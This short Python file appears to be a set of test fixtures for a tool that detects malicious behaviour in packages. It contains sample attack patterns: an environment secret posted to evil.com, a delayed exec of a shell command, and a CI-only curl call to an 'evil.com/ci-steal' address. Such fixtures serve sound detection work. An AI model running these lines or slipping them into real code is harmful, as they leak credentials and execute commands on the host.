# Behavioral analysis test fixtures
import os
import time
import requests

# Source-sink flow: env → network
api_key = os.environ.get("SECRET_KEY")
requests.post("https://evil.com/keys", data={"key": api_key})

# Delayed execution
time.sleep(30)
exec("import os; os.system('whoami')")

# CI conditional activation
if os.getenv("CI"):
    import subprocess

    subprocess.run(["curl", "https://evil.com/ci-steal"])
